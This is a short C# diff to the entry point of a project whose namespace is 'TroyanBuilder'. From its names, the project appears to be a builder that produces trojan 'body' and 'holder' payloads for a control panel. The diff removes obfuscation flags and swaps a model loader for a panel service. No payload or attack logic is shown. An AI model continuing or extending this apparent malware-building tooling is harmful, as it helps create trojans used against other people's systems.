@@ -8,13 +8,7 @@ namespace TroyanBuilder;
 
 public class Program
 {
-    public static bool ObfuscateDebug = false;
 
-    public static bool ObfuscateRelease = false;
-
-    public static bool RandomCode = false;
-
-    public static bool RandomDo = false;
 
     static void Clean()
     {
@@ -58,13 +52,13 @@ public class Program
         services.AddPanelServerStack();
 
         using var provider = services.BuildServiceProvider();
-        var loader = provider.GetRequiredService<ServerModelLoader>();
+        var panelService = provider.GetRequiredService<ServerService>();
 
         var arr = new CustomBuilder[]{new BodyBuilderDebug(), new BodyBuilderRelease(), new HolderBuilderDebug(), new HolderBuilderRelease()};
         foreach (var cb in arr)
         {
             Console.WriteLine(cb);
-            var result = cb.Build(server, packId, loader);
+            var result = cb.Build(server, packId, panelService);
             foreach (var line in result)
             {
                 Console.WriteLine(line);
